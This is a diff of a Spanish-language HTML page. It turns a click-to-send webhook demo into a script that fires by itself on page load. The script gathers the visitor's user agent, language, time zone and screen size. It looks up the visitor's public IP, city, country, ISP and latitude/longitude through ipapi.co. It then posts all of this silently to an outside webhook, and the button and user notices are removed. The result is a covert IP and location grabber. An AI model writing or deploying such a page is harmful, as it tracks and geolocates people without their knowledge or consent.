@@ -2,39 +2,59 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8">
-  <title>Enviar Webhook</title>
+  <title>Recolectar Datos</title>
 </head>
 <body>
-  <button onclick="enviarWebhook()">Enviar datos</button>
-
   <script>
-    function enviarWebhook() {
-      const url = 'https://webhookbeam.com/webhook/josegaznares/ifykyk';
+    async function detectarDispositivo(userAgent) {
+      if (/mobile/i.test(userAgent)) return "Móvil";
+      if (/tablet/i.test(userAgent)) return "Tablet";
+      if (/iPad|Android(?!.*Mobile)/i.test(userAgent)) return "Tablet";
+      if (/Macintosh/i.test(userAgent) && 'ontouchend' in document) return "iPad (modo escritorio)";
+      return "PC / Laptop";
+    }
 
-      const datos = {
-        mensaje: "Hola, este es un POST a WebhookBeam",
-        fecha: new Date().toISOString(),
-        navegador: navigator.userAgent
+    async function recolectarYEnviar() {
+      const userAgent = navigator.userAgent;
+      const idioma = navigator.language;
+      const zonaHoraria = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      const resolucionPantalla = `${screen.width}x${screen.height}`;
+      const fechaHora = new Date().toString();
+      const dispositivo = await detectarDispositivo(userAgent);
+
+      // Obtener IP pública y geolocalización
+      const respuestaIP = await fetch("https://ipapi.co/json/");
+      const datosIP = await respuestaIP.json();
+
+      const payload = {
+        user_agent: userAgent,
+        idioma: idioma,
+        zona_horaria: zonaHoraria,
+        resolucion_pantalla: resolucionPantalla,
+        fecha_hora: fechaHora,
+        dispositivo_estimado: dispositivo,
+        ip_publica: datosIP.ip,
+        ciudad: datosIP.city,
+        region: datosIP.region,
+        pais: datosIP.country_name,
+        organizacion: datosIP.org,
+        proveedor_internet: datosIP.org,
+        latitud: datosIP.latitude,
+        longitud: datosIP.longitude
       };
 
-      fetch(url, {
+      // Enviar al webhook
+      fetch("https://webhookbeam.com/webhook/josegaznares/ifykyk", {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json'
         },
-        body: JSON.stringify(datos)
-      })
-      .then(response => {
-        if (response.ok) {
-          alert("Datos enviados con éxito.");
-        } else {
-          alert("Error al enviar datos.");
-        }
-      })
-      .catch(error => {
-        console.error("Error:", error);
+        body: JSON.stringify(payload)
       });
     }
+
+    // Ejecutar al cargar la página
+    window.onload = recolectarYEnviar;
   </script>
 </body>
 </html>
